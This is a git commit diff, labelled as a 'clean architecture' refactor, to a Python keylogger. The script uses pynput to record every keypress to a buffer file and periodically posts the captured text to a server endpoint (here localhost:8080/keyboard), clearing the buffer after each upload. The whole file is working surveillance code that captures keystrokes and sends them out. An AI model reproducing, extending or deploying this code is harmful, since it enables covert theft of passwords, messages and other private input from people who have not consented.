cd34893297a579e7e8194e7c60c027be12333a2d
Lebackrobot <lebackman18@gmail.com>
2025-03-27 23:57:20 -0300

    ♻️ refactor: clean architecture

--- main.py
+++ main.py
@@ -1,10 +1,10 @@
 from pynput.keyboard import Listener
 import schedule
-
+import time
 import requests
 
-LOG_FILE = 'keyboard_logs.txt'
-SERVER_URL = '...'
+LOG_FILE = 'buffer.txt'
+SERVER_URL = 'http://localhost:8080/keyboard'
 
 
 def on_press(key):
@@ -17,18 +17,28 @@ def on_press(key):
             file.write(f' {key} \n')
 
 def send_logs():
+    print('>>>>>>')
+
     try:
         with open(LOG_FILE, 'r') as file:
             data = file.read()
         
         if data.strip(): 
-            requests.post(SERVER_URL, data={'logs': data})
+            requests.post(SERVER_URL, json={'content': data})
+
+            with open(LOG_FILE, "w") as file:
+                file.write("")
                 
     except Exception as e:
         ...
 
-schedule.every(5).minutes.do(send_logs)
+schedule.every(5).seconds.do(send_logs)
 
+# Agendar envio a cada 10 segundos
+schedule.every(10).seconds.do(send_logs)
+
+# Executar o listener e o scheduler em paralelo
 with Listener(on_press=on_press) as listener:
-    listener.join()    
-
+    while True:
+        schedule.run_pending()  # Roda as tarefas agendadas
+        time.sleep(1)  # Evita uso excessivo da CPU
